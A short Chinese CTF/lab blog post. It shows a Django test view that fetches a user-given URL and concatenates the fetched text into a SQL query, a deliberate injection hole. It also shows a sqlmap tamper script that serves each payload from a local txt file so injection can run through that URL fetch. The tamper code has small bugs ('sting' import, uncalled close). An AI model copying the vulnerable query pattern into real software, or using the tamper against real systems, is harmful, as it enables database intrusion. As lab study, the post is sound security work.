前段时间我这玩CTF的靶场，里面有一个很有意思的注入漏洞，后端是sqlite3做数据库，前台有一个地方上传txt，然后就会拿txt内容进行数据库查询，我根据它的原理，写了个sqlmap的tamper，可惜当时不行，就做了一下记录，刚刚翻到记录，为了验证想法，就写了一个测试网站出来。很简单，前台接受网址，后台解析查询，返回查询结果

    
    
    #views.py
    
    from django.shortcuts import render
    import pymysql
    import requests
    # Create your views here.from django.http import HttpResponse
    
    
    def te(request):
        url = request.GET.get("url")
        r = requests.get(url=url)
        id = r.text.strip()
        db = pymysql.connect("127.0.0.1", "root", "123456", "t1", charset='utf8')
        cursor = db.cursor()
        cursor.execute("SELECT * FROM test where id =" + id)
        data = cursor.fetchone()
    
        db.close()
        return HttpResponse(data[1])
    
      
    

这是正常逻辑，txt内容为1

![image.png](https://image.3001.net/images/20191126/1574735699_5ddc8f5368560.png!small)于是我就写了一个tamper进行注入，很简单，kali本地生成随机txt，里面写payloads，返回txt的访问地址

    
    
    # !/usr/bin/env python
    
    import random
    import sting
    import re
    
    from lib.core.data import kb
    from lib.core.enums import PRIORITY
    
    __priority__ = PRIORITY.NORMAL
    
    
    def dependencies():
        pass
    
    
    def tamper(payload, **kwargs):
        retVal = payload
        name = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    
        if payload:
            f = open("/var/www/html/" + name + '.txt', 'w')
            f.write(payload)
            f.close
    
        return "http://192.168.0.106/" + name + ".txt"
      
    

测试过程

![image.png](https://image.3001.net/images/20191126/1574735874_5ddc900288fa9.png)  

